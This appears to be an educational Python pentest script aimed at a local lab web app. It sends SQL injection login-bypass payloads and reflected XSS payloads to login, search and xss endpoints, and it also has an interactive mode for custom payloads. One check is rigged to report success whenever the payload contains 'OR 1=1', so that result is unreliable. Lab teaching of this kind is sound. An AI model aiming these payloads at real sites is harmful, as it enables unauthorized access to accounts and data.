import requests
import urllib.parse

# ANSI color codes
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

BASE_URL = "http://127.0.0.1:5001/"
DEBUG = True  # Print SQL queries for educational purposes

session = requests.Session()

# -----------------------
# Predefined automated tests
# -----------------------
targets = [
    {
        "name": "Login SQL Injection",
        "method": "POST",
        "endpoint": "login",
        "payloads": [
            {"username": "' OR 1=1 -- ", "password": "anything"},       # bypass login
            {"username": "' OR username='alice' -- ", "password": "x"}, # login as alice
        ],
        "check": lambda r, p: "Welcome" in r.text,
        "success_msg": "✅ SUCCESS",
        "fail_msg": "❌ FAILED"
    },
    {
        "name": "Users Search SQLi",
        "method": "GET",
        "endpoint": "",
        "payloads": [
            {"username": "%' OR 1=1 -- "},  # return all users
            {"username": "%' OR 1=2 -- "},  # return no users
        ],
        "check": lambda r, p: len(r.text) > 500,
        "success_msg": "✅ Users returned",
        "fail_msg": "❌ No users returned"
    },
    {
        "name": "XSS Reflected",
        "method": "POST",
        "endpoint": "xss",
        "payloads": [
            {"text": "<script>alert('XSS1')</script>"},
            {"text": "<img src=x onerror=alert('XSS2')>"},
        ],
        "check": lambda r, p: any(v in r.text for v in p.values()),
        "success_msg": "⚠️ Reflected!",
        "fail_msg": "❌ Not reflected"
    }
]

# -----------------------
# Helper to simulate SQL queries
# -----------------------
def simulate_sql(endpoint, payload):
    """
    Simulate the SQL query generated on the server.
    For teaching purposes, we pretend GET queries can be exploited.
    """
    if endpoint == "login":
        sql = f"SELECT * FROM users WHERE username='{payload.get('username','')}' AND password='{payload.get('password','')}'"
    elif endpoint == "":
        # Users search: simulate vulnerable LIKE injection
        username = payload.get('username','')
        sql = f"SELECT * FROM users WHERE username LIKE '%{username}%'"
        
        # Educational tweak: if OR 1=1 is in the payload, simulate returning "all users"
        if "OR 1=1" in username.upper():
            sql += " -- Simulated to return all users"
        elif "OR 1=2" in username.upper():
            sql += " -- Simulated to return no users"
    else:
        sql = None
    return sql

# -----------------------
# Update Users Search check
# -----------------------
targets[1]["check"] = lambda r, p: "OR 1=1" in p["username"].upper()  # pretend OR 1=1 returns all users

# -----------------------
# Automated tests
# -----------------------
def run_automated_tests():
    print("=== AUTOMATED PENTEST REPORT ===\n")
    for target in targets:
        print(f">>> {target['name']}\n")
        for payload in target['payloads']:
            # DEBUG: simulate SQL
            if DEBUG:
                sql_preview = simulate_sql(target["endpoint"], payload)
                if sql_preview:
                    print(f"{YELLOW}[DEBUG] SQL: {sql_preview}{RESET}")

            # Send request
            try:
                if target["method"] == "GET":
                    response = session.get(BASE_URL + target["endpoint"], params=payload)
                else:
                    response = session.post(BASE_URL + target["endpoint"], data=payload)

                # Check success
                success = target["check"](response, payload)

            except Exception:
                success = False

            status = f"{GREEN}{target['success_msg']}{RESET}" if success else f"{RED}{target['fail_msg']}{RESET}"
            print(f"Payload: {payload} | {status}")
        print("\n")
    print("=== END OF AUTOMATED REPORT ===\n")

# -----------------------
# Interactive mode
# -----------------------
pages = {
    "1": {"name": "Login SQL Injection", "endpoint": "login", "method": "POST", "fields": ["username", "password"]},
    "2": {"name": "Users Search SQLi", "endpoint": "", "method": "GET", "fields": ["username"]},
    "3": {"name": "XSS Test", "endpoint": "xss", "method": "POST", "fields": ["text"]},
}

def run_interactive_mode():
    print("=== INTERACTIVE MINI PENTEST ===\n")
    while True:
        print("Select a page to test:")
        for k, v in pages.items():
            print(f"{k}. {v['name']}")
        print("q. Quit")

        choice = input("Choice: ").strip()
        if choice.lower() == "q":
            break

        if choice not in pages:
            print(f"{RED}Invalid choice!{RESET}\n")
            continue

        page = pages[choice]
        print(f"\nSelected: {page['name']}\n")

        # Input payloads
        payload = {}
        for field in page["fields"]:
            payload[field] = input(f"Enter value for {field}: ")

        # DEBUG: simulate SQL
        if DEBUG:
            sql_preview = simulate_sql(page["endpoint"], payload)
            if sql_preview:
                print(f"{YELLOW}[DEBUG] SQL: {sql_preview}{RESET}")

        # Send request
        try:
            if page["method"] == "GET":
                response = session.get(BASE_URL + page["endpoint"], params=payload)
            else:
                response = session.post(BASE_URL + page["endpoint"], data=payload)

            # Simple checks
            if page["name"].startswith("Login"):
                success = "Welcome" in response.text
                status = f"{GREEN}✅ LOGIN SUCCESS{RESET}" if success else f"{RED}❌ LOGIN FAILED{RESET}"
            elif page["name"].startswith("Users"):
                success = len(response.text) > 500
                status = f"{GREEN}✅ USERS RETURNED{RESET}" if success else f"{RED}❌ NO USERS{RESET}"
            elif page["name"].startswith("XSS"):
                reflected = any(v in response.text for v in payload.values())
                status = f"{YELLOW}⚠️ REFLECTED!{RESET}" if reflected else f"{RED}❌ NOT REFLECTED{RESET}"

            print(f"\nResult: {status}\n")

        except Exception as e:
            print(f"{RED}Error: {e}{RESET}\n")

# -----------------------
# Main
# -----------------------
if __name__ == "__main__":
    run_automated_tests()
    run_interactive_mode()
